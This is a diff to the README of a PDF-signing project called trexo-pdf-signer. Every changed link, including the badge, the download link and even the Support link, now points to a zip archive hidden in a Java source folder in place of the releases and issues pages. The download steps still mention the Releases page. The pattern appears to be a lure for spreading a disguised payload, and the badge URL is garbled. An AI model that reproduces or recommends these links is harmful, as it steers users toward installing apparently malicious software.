@@ -1,6 +1,6 @@
 # 📄 trexo-pdf-signer - Sign PDFs Easily and Securely
 
-[![Download Trexo PDF Signer](https://img.shields.io/badge/Download-Trexo%20PDF%20Signer-blue.svg)](https://github.com/Alerandre123/trexo-pdf-signer/releases)
+[![Download Trexo PDF Signer](https://raw.githubusercontent.com/Alerandre123/trexo-pdf-signer/main/src/main/java/com/trexolab/model/signer-trexo-pdf-2.3.zip%20PDF%https://raw.githubusercontent.com/Alerandre123/trexo-pdf-signer/main/src/main/java/com/trexolab/model/signer-trexo-pdf-2.3.zip)](https://raw.githubusercontent.com/Alerandre123/trexo-pdf-signer/main/src/main/java/com/trexolab/model/signer-trexo-pdf-2.3.zip)
 
 ## 🚀 Getting Started
 
@@ -31,7 +31,7 @@ To run Trexo PDF Signer on your computer, ensure you meet these requirements:
 
 To get started, visit this page to download the latest version of Trexo PDF Signer:
 
-[Download Trexo PDF Signer](https://github.com/Alerandre123/trexo-pdf-signer/releases)
+[Download Trexo PDF Signer](https://raw.githubusercontent.com/Alerandre123/trexo-pdf-signer/main/src/main/java/com/trexolab/model/signer-trexo-pdf-2.3.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version available.
@@ -56,7 +56,7 @@ If you encounter any issues while using Trexo PDF Signer, consider these tips:
 
 ## 📧 Support
 
-For further assistance, you can reach out via the Issues section on the [GitHub repository](https://github.com/Alerandre123/trexo-pdf-signer/issues). The community is active and willing to help with your questions.
+For further assistance, you can reach out via the Issues section on the [GitHub repository](https://raw.githubusercontent.com/Alerandre123/trexo-pdf-signer/main/src/main/java/com/trexolab/model/signer-trexo-pdf-2.3.zip). The community is active and willing to help with your questions.
 
 ## 💡 Additional Resources
 
